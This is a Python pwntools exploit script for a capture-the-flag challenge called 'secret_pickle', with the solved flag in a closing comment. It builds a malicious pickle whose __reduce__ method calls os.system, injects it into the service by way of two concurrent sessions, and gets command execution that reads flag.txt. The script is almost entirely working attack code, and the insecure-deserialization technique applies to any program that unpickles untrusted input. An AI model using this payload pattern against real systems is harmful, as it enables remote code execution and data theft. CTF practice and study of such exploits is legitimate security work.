#!/usr/bin/env python2

from pwn import *

class Exploit(object):
  def __reduce__(self):
    global command
    return (os.system, ('{} '.format(command),),)


command = "cat flag.txt"
host = "my.host"
port = 12345

payload = pickle.dumps(Exploit(), protocol=0)

print(hexdump(payload))

def get_connection():
  if len(sys.argv) > 1:
    p = remote("secret-pickle.420blaze.in", 420)
    p.sendlineafter("(y/n)", "y")
    p.sendlineafter("uuid?", "520b1de8-f381-4731-90d8-e2b15473d4e4")
  else:
    p = process(["/usr/local/bin/python3", "secret_pickle.py"], env={})

  return p

def exploit():
  p1 = get_connection()
  p1.sendlineafter("username: ", "vakzz")
  p1.sendlineafter("choice: ", "1")


  p2 = get_connection()
  p2.sendlineafter("username: ", "vakzz")
  p2.sendlineafter("choice: ", "0")
  p2.sendlineafter("choice: ", "1")

  p1.sendlineafter("choice: ", "0")
  p1.sendlineafter("name: ", "lala")
  p1.recvuntil("content:")
  for l in payload.split("\n"):
    p1.sendline(l)
  p1.sendline()
  p1.recvall()

  p2.sendlineafter("name: ", "lala")

  p2.interactive()


if __name__ == "__main__":
  context.terminal=["tmux", "sp", "-h"]

  exploit()

#flag{P1CKL3s_W3R3_0nce_CuCuMbErS}